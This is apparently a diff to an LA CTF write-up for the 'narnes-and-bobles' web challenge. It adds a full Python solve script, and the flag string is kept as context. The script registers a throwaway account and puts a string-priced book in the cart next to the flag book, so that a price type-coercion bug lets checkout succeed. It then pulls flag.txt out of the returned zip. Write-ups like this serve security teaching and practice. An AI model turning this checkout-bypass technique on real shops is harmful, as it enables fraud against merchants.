@@ -148,7 +148,154 @@ lactf{matcha_dubai_chocolate_labubu}
 ---
 ## Solve.py
 ```
-python3 solve.py --base "<INSTANCE URL>"
+#!/usr/bin/env python3
+import argparse
+import io
+import os
+import random
+import re
+import string
+import sys
+import zipfile
+from urllib.parse import urljoin
+
+import requests
+
+
+FLAG_RE = re.compile(r"lactf\{[^}]+\}")
+
+# Book IDs from the challenge source
+STRING_PRICE_BOOK_ID = "a3e33c2505a19d18"  # part-time-parliament (price = "10")
+FLAG_BOOK_ID = "2a16e349fb9045fa"          # flag (price = 1000000)
+
+
+def rand_str(n: int = 10) -> str:
+    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser(description="Solve narnes-and-bobles (LA CTF) via price type-coercion bug.")
+    ap.add_argument("--base", required=True, help="Instance base URL, e.g. https://...instancer.lac.tf")
+    ap.add_argument("--user", default=None, help="Optional username (random if omitted)")
+    ap.add_argument("--pw", default=None, help="Optional password (random if omitted)")
+    ap.add_argument("--insecure", action="store_true", help="Disable TLS verification (not recommended)")
+    args = ap.parse_args()
+
+    base = args.base.rstrip("/") + "/"
+    s = requests.Session()
+    s.verify = (not args.insecure)
+
+    username = args.user or f"u_{rand_str(12)}"
+    password = args.pw or f"p_{rand_str(16)}"
+
+    # 1) Register (use /register/ with trailing slash)
+    reg_url = urljoin(base, "register/")
+    r = s.post(reg_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
+    if r.status_code not in (200, 302):
+        print(f"[!] register unexpected status: {r.status_code}", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    # If user already exists, try login instead (or re-roll)
+    if r.status_code == 200 and "user already exists" in r.text.lower():
+        # If user supplied, try logging in. Otherwise reroll a new user.
+        if args.user:
+            pass
+        else:
+            username = f"u_{rand_str(12)}"
+            password = f"p_{rand_str(16)}"
+            r = s.post(reg_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
+            if not (r.status_code in (200, 302) and not ("user already exists" in r.text.lower())):
+                print("[!] failed to register fresh user", file=sys.stderr)
+                print(r.text[:300], file=sys.stderr)
+                sys.exit(1)
+
+    # 2) Login (safe to do even after register)
+    login_url = urljoin(base, "login/")
+    r = s.post(login_url, data={"username": username, "password": password}, allow_redirects=False, timeout=15)
+    if r.status_code not in (200, 302):
+        print(f"[!] login unexpected status: {r.status_code}", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    # 3) Confirm cart empty
+    cart_url = urljoin(base, "cart")
+    r = s.get(cart_url, timeout=15)
+    if r.status_code != 200:
+        print(f"[!] cart unexpected status: {r.status_code}", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    # 4) Add string-price book + flag book together
+    add_url = urljoin(base, "cart/add")
+    payload = {
+        "products": [
+            {"book_id": STRING_PRICE_BOOK_ID, "is_sample": 0},
+            {"book_id": FLAG_BOOK_ID, "is_sample": 0},
+        ]
+    }
+    r = s.post(add_url, json=payload, timeout=15)
+    if r.status_code != 200:
+        print(f"[!] cart/add unexpected status: {r.status_code}", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    try:
+        j = r.json()
+    except Exception:
+        print("[!] cart/add did not return JSON", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    if "err" in j:
+        print(f"[!] server error from /cart/add: {j['err']}", file=sys.stderr)
+        print("[!] If this happens, ensure the cart is empty and the instance matches the challenge.", file=sys.stderr)
+        sys.exit(1)
+
+    # 5) Checkout -> zip
+    checkout_url = urljoin(base, "cart/checkout")
+    r = s.post(checkout_url, timeout=30)
+    if r.status_code != 200:
+        print(f"[!] checkout unexpected status: {r.status_code}", file=sys.stderr)
+        print(r.text[:300], file=sys.stderr)
+        sys.exit(1)
+
+    zdata = io.BytesIO(r.content)
+    try:
+        zf = zipfile.ZipFile(zdata)
+    except zipfile.BadZipFile:
+        print("[!] response is not a valid zip", file=sys.stderr)
+        print(r.content[:200], file=sys.stderr)
+        sys.exit(1)
+
+    # 6) Extract flag.txt
+    names = zf.namelist()
+    if "flag.txt" not in names:
+        print("[!] flag.txt not present in zip. Files:", names, file=sys.stderr)
+        # As a hint, dump any text files
+        for n in names:
+            if n.endswith(".txt"):
+                try:
+                    print(f"--- {n} ---")
+                    print(zf.read(n).decode("utf-8", errors="replace"))
+                except Exception:
+                    pass
+        sys.exit(1)
+
+    flag_txt = zf.read("flag.txt").decode("utf-8", errors="replace")
+    m = FLAG_RE.search(flag_txt)
+    if not m:
+        print("[!] Could not find lactf{...} in flag.txt contents:", file=sys.stderr)
+        print(flag_txt, file=sys.stderr)
+        sys.exit(1)
+
+    print(m.group(0))
+
+
+if __name__ == "__main__":
+    main()
+
+"
 ```
 
 ---
